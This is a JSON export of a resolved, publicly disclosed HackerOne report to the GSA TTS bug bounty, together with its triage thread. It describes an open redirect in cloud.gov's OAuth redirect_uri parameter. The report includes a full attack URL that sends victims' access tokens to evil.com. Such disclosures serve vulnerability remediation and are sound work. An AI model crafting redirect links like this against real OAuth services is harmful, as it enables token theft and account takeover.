{"id":665651,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NjU2NTE=","url":"https://hackerone.com/reports/665651","title":"Stealing Users OAuth Tokens through redirect_uri parameter","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-08-01T21:08:15.035Z","submitted_at":"2019-08-01T21:08:15.035Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"manshum12","url":"/manshum12","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/FYpT9QjdFin6Bnh2zrWMWqCu/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":21499,"url":"https://hackerone.com/tts","handle":"tts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/021/499/a8abb6c9702d454ed2bcfa55bb077ac2e49988b9_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/499/a8abb6c9702d454ed2bcfa55bb077ac2e49988b9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"TTS Bug Bounty","twitter_handle":"gsa_tts","website":"https://18f.gsa.gov","about":"The First Civilian Agency Public Bug Bounty Program"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-10-01T18:25:11.364Z","bug_reporter_agreed_on_going_public_at":"2019-09-28T02:48:56.658Z","team_member_agreed_on_going_public_at":"2019-10-01T18:25:11.234Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I found that https://login.fr.cloud.gov/oauth/authorize has vulnerability by open redirect on oauth redirect_uri which can lead to users oauth tokens being leaked to any malicious user.\n\nStep : \n1, Clicked on link https://login.fr.cloud.gov/oauth/authorize?client_id=███\u0026response_type=token\u0026redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback\u0026state=███\n\n2, Choose any .gov account to login ( Screenshot ) then i believe you will got redirect to evil.com with oauth access token .\n\n## Impact\n\nAttacker can using this bug to stolen victim access token , that means he can takeover victim account .","vulnerability_information_html":"\u003cp\u003eI found that \u003ca title=\"https://login.fr.cloud.gov/oauth/authorize\" href=\"/redirect?url=https%3A%2F%2Flogin.fr.cloud.gov%2Foauth%2Fauthorize\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://login.fr.cloud.gov/oauth/authorize\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e has vulnerability by open redirect on oauth redirect_uri which can lead to users oauth tokens being leaked to any malicious user.\u003c/p\u003e\n\n\u003cp\u003eStep : \u003cbr\u003e\n1, Clicked on link \u003ca title=\"https://login.fr.cloud.gov/oauth/authorize?client_id=%E2%96%88%E2%96%88%E2%96%88\u0026amp;response_type=token\u0026amp;redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback\u0026amp;state=%E2%96%88%E2%96%88%E2%96%88\" href=\"/redirect?url=https%3A%2F%2Flogin.fr.cloud.gov%2Foauth%2Fauthorize%3Fclient_id%3D%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fevil.com%252Fauth%252Fcallback%26state%3D%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://login.fr.cloud.gov/oauth/authorize?client_id=%E2%96%88%E2%96%88%E2%96%88\u0026amp;response_type=token\u0026amp;redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback\u0026amp;state=%E2%96%88%E2%96%88%E2%96%88\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e2, Choose any .gov account to login ( Screenshot ) then i believe you will got redirect to evil.com with oauth access token .\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAttacker can using this bug to stolen victim access token , that means he can takeover victim account .\u003c/p\u003e\n","bounty_amount":"750.0","formatted_bounty":"$750","weakness":{"id":53,"name":"Open Redirect"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":47,"voters":["mashoud1122","spam404","sameerphad72","manshum12","michan","masonhck357","nessun00x","exception","cr4xerbik4sh","zimmer75","and 37 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":991,"asset_type":"URL","asset_identifier":"https://login.fr.cloud.gov/","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5490106,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @tom2314,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@magicmouse ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/tom2314\"\u003e@tom2314\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/magicmouse\"\u003e@magicmouse\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-02T16:23:06.648Z","updated_at":"2019-08-02T16:23:06.648Z","actor":{"username":"magicmouse","cleared":false,"url":"/magicmouse","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/7koyrfQNuacHWmAt2BWtP73b/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5492065,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @tom2314, \n\nThanks for your patience! Do you have any evidence that the open redirect will trigger?\n\nWarm Regards,\n\n@magicmouse ","markdown_message":"\u003cp\u003eHello \u003ca href=\"/tom2314\"\u003e@tom2314\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eThanks for your patience! Do you have any evidence that the open redirect will trigger?\u003c/p\u003e\n\n\u003cp\u003eWarm Regards,\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/magicmouse\"\u003e@magicmouse\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-02T22:05:33.385Z","updated_at":"2019-08-02T22:05:33.385Z","actor":{"username":"magicmouse","cleared":false,"url":"/magicmouse","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/7koyrfQNuacHWmAt2BWtP73b/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5575279,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"@magicmouse For some reason i have credentials from https://idp.fr.cloud.gov in 3 weeks ago, it's why i can verify this bug, but now the credentials from https://idp.fr.cloud.gov is didn't work anymore, so ...... ","markdown_message":"\u003cp\u003e\u003ca href=\"/magicmouse\"\u003e@magicmouse\u003c/a\u003e For some reason i have credentials from \u003ca title=\"https://idp.fr.cloud.gov\" href=\"/redirect?url=https%3A%2F%2Fidp.fr.cloud.gov\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://idp.fr.cloud.gov\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e in 3 weeks ago, it\u0026#39;s why i can verify this bug, but now the credentials from \u003ca title=\"https://idp.fr.cloud.gov\" href=\"/redirect?url=https%3A%2F%2Fidp.fr.cloud.gov\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://idp.fr.cloud.gov\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is didn\u0026#39;t work anymore, so ...... \u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-14T12:23:02.118Z","updated_at":"2019-08-14T12:23:22.607Z","actor":{"username":"manshum12","cleared":true,"url":"/manshum12","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FYpT9QjdFin6Bnh2zrWMWqCu/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5668705,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @tom2314  - We are looking into this issue still. Thanks for your patience as we dig deeper into this. ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/tom2314\"\u003e@tom2314\u003c/a\u003e  - We are looking into this issue still. Thanks for your patience as we dig deeper into this. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-26T18:53:06.120Z","updated_at":"2019-08-26T18:53:06.120Z","actor":{"username":"coffeecup","cleared":false,"url":"/coffeecup","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/163/756/b715ab701f6ba35c13cf00277bf23f9ab1a5e1cb_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5684567,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@coffercup alright but i submit this report 27 days almost a month ..........","markdown_message":"\u003cp\u003e\u003ca href=\"/coffercup\"\u003e@coffercup\u003c/a\u003e alright but i submit this report 27 days almost a month ..........\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-28T15:52:59.075Z","updated_at":"2019-08-28T15:52:59.075Z","actor":{"username":"manshum12","cleared":true,"url":"/manshum12","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FYpT9QjdFin6Bnh2zrWMWqCu/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5701548,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tom2314 Yes, thank you for your patience! I'm on the cloud.gov team, and our engineers are looking into it. If you have any additional evidence (such as information about the credentials you obtained), let us know and we can integrate that into our research.","markdown_message":"\u003cp\u003e\u003ca href=\"/tom2314\"\u003e@tom2314\u003c/a\u003e Yes, thank you for your patience! I\u0026#39;m on the cloud.gov team, and our engineers are looking into it. If you have any additional evidence (such as information about the credentials you obtained), let us know and we can integrate that into our research.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-30T22:44:37.180Z","updated_at":"2019-08-30T22:44:37.180Z","actor":{"username":"britta","cleared":false,"url":"/britta","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/194/289/1b5786986cadea87070893685e3ea7bd77e2d975_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5818884,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@manshum12 I am unable to reproduce this. Can you please provide a set of steps required to reproduce?","markdown_message":"\u003cp\u003e\u003ca href=\"/manshum12\"\u003e@manshum12\u003c/a\u003e I am unable to reproduce this. Can you please provide a set of steps required to reproduce?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-16T19:26:25.411Z","updated_at":"2019-09-16T19:26:25.411Z","actor":{"username":"mxplusb","cleared":false,"url":"/mxplusb","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5818885,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-16T19:26:34.212Z","updated_at":"2019-09-16T19:26:34.212Z","actor":{"username":"mxplusb","cleared":false,"url":"/mxplusb","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5837288,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I found a way to reproduce this, that behaviour is not present on cloud.gov at the time of this comment.","markdown_message":"\u003cp\u003eI found a way to reproduce this, that behaviour is not present on cloud.gov at the time of this comment.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-18T16:20:23.018Z","updated_at":"2019-09-18T16:20:23.018Z","actor":{"username":"mxplusb","cleared":false,"url":"/mxplusb","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5837306,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey @manshum12 \n\nThank you for your submission. Appreciate the report. :)\n\nThanks!","markdown_message":"\u003cp\u003eHey \u003ca href=\"/manshum12\"\u003e@manshum12\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Appreciate the report. :)\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-18T16:22:54.981Z","updated_at":"2019-09-18T16:22:54.981Z","actor":{"username":"mxplusb","cleared":false,"url":"/mxplusb","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"manshum12","url":"/manshum12"},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5899947,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":" Hey @manshum12, we have determined that this issue is eligible for a bounty, and are issuing you a $750 bounty for this `High`-severity issue.\n\nThank you once again for your report and we look forward to working with you again in the near future. ","markdown_message":"\u003cp\u003eHey \u003ca href=\"/manshum12\"\u003e@manshum12\u003c/a\u003e, we have determined that this issue is eligible for a bounty, and are issuing you a $750 bounty for this \u003ccode\u003eHigh\u003c/code\u003e-severity issue.\u003c/p\u003e\n\n\u003cp\u003eThank you once again for your report and we look forward to working with you again in the near future. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-26T22:20:32.736Z","updated_at":"2019-09-26T22:20:32.736Z","actor":{"url":"/tts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/499/a8abb6c9702d454ed2bcfa55bb077ac2e49988b9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"TTS Bug Bounty"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"tts","collaborator":{"username":"manshum12","url":"/manshum12"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5900022,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-26T22:37:13.735Z","updated_at":"2019-09-26T22:37:13.735Z","additional_data":{"old_title":"Stealing Users Oauth Tokens ( Open Redirect )","new_title":"Stealing Users Oauth Tokens through redirect_uri parameter"},"actor":{"username":"coffeecup","cleared":false,"url":"/coffeecup","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/163/756/b715ab701f6ba35c13cf00277bf23f9ab1a5e1cb_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5909295,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thank for the bounty !\nAnyway can this report limited disclosure not full disclosure ?","markdown_message":"\u003cp\u003eThank for the bounty !\u003cbr\u003e\nAnyway can this report limited disclosure not full disclosure ?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-28T02:48:56.687Z","updated_at":"2019-09-28T02:48:56.687Z","first_to_agree":true,"actor":{"username":"manshum12","cleared":true,"url":"/manshum12","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FYpT9QjdFin6Bnh2zrWMWqCu/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5935470,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-01T18:24:39.884Z","updated_at":"2019-10-01T18:24:39.884Z","additional_data":{"old_title":"Stealing Users Oauth Tokens through redirect_uri parameter","new_title":"Stealing Users OAuth Tokens through redirect_uri parameter"},"actor":{"username":"coffeecup","cleared":false,"url":"/coffeecup","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/163/756/b715ab701f6ba35c13cf00277bf23f9ab1a5e1cb_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5935479,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"This report is now disclosed. ","markdown_message":"\u003cp\u003eThis report is now disclosed. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-01T18:25:11.264Z","updated_at":"2019-10-01T18:25:11.264Z","actor":{"username":"coffeecup","cleared":false,"url":"/coffeecup","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/163/756/b715ab701f6ba35c13cf00277bf23f9ab1a5e1cb_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5935480,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-01T18:25:11.401Z","updated_at":"2019-10-01T18:25:11.401Z","actor":{"username":"coffeecup","cleared":false,"url":"/coffeecup","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/163/756/b715ab701f6ba35c13cf00277bf23f9ab1a5e1cb_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}